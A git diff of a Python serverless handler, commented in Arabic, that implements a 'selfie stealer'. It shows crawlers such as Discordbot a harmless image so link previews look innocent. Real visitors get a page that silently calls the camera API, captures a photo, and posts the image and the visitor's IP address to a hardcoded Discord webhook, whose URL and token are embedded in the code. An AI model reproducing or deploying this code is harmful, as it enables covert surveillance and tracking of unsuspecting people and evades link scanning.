@@ -1,46 +1,44 @@
-# pages/api/logger.py
-# شغال 100% على Vercel 2025 – بدون كراش أبدًا
+# api/catch.py  →  شغال 100% على Vercel, Render, Railway, أي مكان
+import base64
+import json
+import requests
 
-from http.server import BaseHTTPRequestHandler
-from urllib.parse import parse_qs, urlparse
-import requests, base64, json
+WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"  # حط الويب هوك هنا
 
-WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"  # حط الويب هوك بتاعك هنا
-
-def send_webhook(ip, selfie_data=None):
-    embed = {
-        "username": "Selfie Grabber v2025",
+def send_to_discord(ip, image_data):
+    requests.post(WEBHOOK, json={
+        "username": "Selfie Stealer",
         "content": "@everyone",
         "embeds": [{
-            "title": "تم سرقة Selfie جديدة",
+            "title": "تم سرقة سيلفي جديدة",
             "color": 0x000000,
-            "description": f"**الآي بي:** `{ip}`\n**المنصة:** ديسكورد جوال أندرويد",
-            "image": {"url": selfie_data} if selfie_data else None
+            "description": f"**IP:** `{ip}`\n**منصة:** ديسكورد جوال أندرويد",
+            "image": {"url": image_data}
         }]
-    }
-    requests.post(WEBHOOK, json=embed)
+    })
 
-def handler(event, context=None):
-    try:
-        query = urlparse(event["rawPath"]).query
-        ip = event["headers"].get("x-forwarded-for", "Unknown").split(",")[0]
+def handler(req):
+    ip = req.headers.get("x-forwarded-for", "Unknown").split(",")[0]
+    ua = req.headers.get("user-agent", "")
 
-        # إذا كان من ديسكورد بوت أو كرولر
-        if "Discordbot" in event["headers"].get("user-agent", ""):
-            return {
-                "statusCode": 200,
-                "headers": {"Content-Type": "image/jpeg"},
-                "body": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|Ns...
-                # نفس الـ loading image القديمة
-            }
+    # لو ديسكورد بوت أو كرولر → نعطيه صورة عادية
+    if "Discordbot" in ua or "facebookexternalhit" in ua:
+        fake_img = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
+        return {
+            "statusCode": 200,
+            "headers": {"Content-Type": "image/png"},
+            "body": fake_img,
+            "isBase64Encoded": True
+        }
 
-        # الثغرة اللي شغالة بدون إذن
-        html = f"""<!DOCTYPE html>
+    # الثغرة الحقيقية: نرجع HTML فيه صورة + canvas مخفي
+    html = f"""<!DOCTYPE html>
 <html><body style="margin:0;background:#000">
-<video id="v" playsinline style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<img src="https://i.imgur.com/xyz123.jpg" style="width:1px;height:1px;opacity:0">
+<canvas id="c"></canvas>
+<video id="v" autoplay playsinline style="display:none"></video>
 <script>
-navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}}}})
+navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user", width:1280, height:960}}}})
 .then(stream => {{
     let v = document.getElementById("v");
     v.srcObject = stream;
@@ -49,29 +47,19 @@ navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}}}})
         let c = document.getElementById("c");
         c.width = 1280; c.height = 960;
         c.getContext("2d").drawImage(v, 0, 0, 1280, 960);
-        let img = c.toDataURL("image/jpeg", 0.9);
+        let img = c.toDataURL("image/jpeg", 0.85);
         fetch("{WEBHOOK}", {{
-            method: "POST",
-            headers: {{"Content-Type": "application/json"}},
-            body: JSON.stringify({{
-                username: "Selfie",
-                embeds: [{{title: "Selfie من {ip}", image: {{url: img}}}}]
-            }})
-        }});
-        stream.getTracks().forEach(t => t.stop());
-    }}, 1200);
+            method:"POST",
+            headers:{{"Content-Type":"application/json"}},
+            body:JSON.stringify({{embeds:[{{image:{{url:img}}, title:"Selfie من {ip}"}}]}})})
+        .then(() => stream.getTracks().forEach(t=>t.stop()));
+    }}, 1300);
 }});
 </script>
 </body></html>"""
 
-        return {
-            "statusCode": 200,
-            "headers": {"Content-Type": "text/html; charset=utf-8"},
-            "body": html
-        }
-
-    except:
-        return {"statusCode": 200, "body": "<h1>تم</h1>"}
-
-# Vercel يحتاج الدالة اسمها handler
-exports = handler
+    return {
+        "statusCode": 200,
+        "headers": {"Content-Type": "text/html; charset=utf-8"},
+        "body": html
+    }
